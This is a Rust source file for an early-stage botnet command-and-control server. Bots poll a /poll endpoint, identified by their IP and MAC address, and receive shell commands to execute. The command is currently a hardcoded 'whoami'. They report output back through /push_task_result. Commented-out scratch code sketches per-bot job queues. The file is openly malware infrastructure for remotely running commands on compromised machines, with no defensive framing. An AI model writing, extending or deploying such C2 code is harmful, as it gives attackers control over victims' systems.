use actix_protobuf::*;
use actix_web::{web, App, Error, HttpResponse, HttpServer, Result};
use c2::{ExecuteReq, TaskResult};
use std::collections::BTreeMap;
use std::collections::VecDeque;
mod utils;
use utils::*;
mod c2;

async fn handle_task_result(task_result: ProtoBuf<c2::TaskResult>) -> Result<HttpResponse, Error> {
    let data = task_result.data.clone();
    let _ = match data {
        Some(c2::task_result::Data::Info(info_res)) => {
            println!("got info res: {:?}", info_res);
        }
        Some(c2::task_result::Data::Execute(execute_res)) => {
            println!("got execute res: {:?}", execute_res);
        }
        _ => {
            unimplemented!();
        }
    };
    HttpResponse::Ok().protobuf(c2::Empty::default())
}

async fn handle_poll(bot_id: ProtoBuf<c2::BotId>) -> Result<HttpResponse, Error> {
    let id = utils::gen_uuid(&bot_id.ip, &bot_id.mac);
    println!("got poll from id:{:?}", id);
    let mut res = c2::Task::default();
    let data = c2::task::Data::Execute(ExecuteReq {
        cmd: "whoami".to_string(),
    });
    res.data = Some(data);

    HttpResponse::Ok().protobuf(res) // <- send response
}
#[actix_web::main]
async fn main() -> std::io::Result<()> {
    // let mut bots_jobs = BTreeMap::new();
    // let jobs: VecDeque<u32> = VecDeque::new();
    // bots_jobs.insert("bot1", jobs);

    // match bots_jobs.get_mut("bot1") {
    //     Some(jobs) => {
    //         jobs.push_back(123);
    //     },
    //     None => {
    //         println!("bot1 not exist");
    //     }
    // }
    // match bots_jobs.get_mut("bot2") {
    //     Some(jobs) => {
    //         jobs.push_back(123);
    //     },
    //     None => {
    //         println!("bot2 not exist");
    //     }
    // }
    // jobs.push_back(1);
    // jobs.push_back(1);
    // jobs.push_back(2);
    // jobs.push_back(3);

    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    // dbg!(jobs.pop_front());
    std::env::set_var("RUST_LOG", "actix_web=debug,actix_server=info");
    env_logger::init();

    HttpServer::new(|| {
        App::new()
            .service(web::resource("/poll").route(web::post().to(handle_poll)))
            .service(web::resource("/push_task_result").route(web::post().to(handle_task_result)))
    })
    // .wrap(middleware::Logger::default())
    .bind("127.0.0.1:8080")?
    .run()
    .await
}
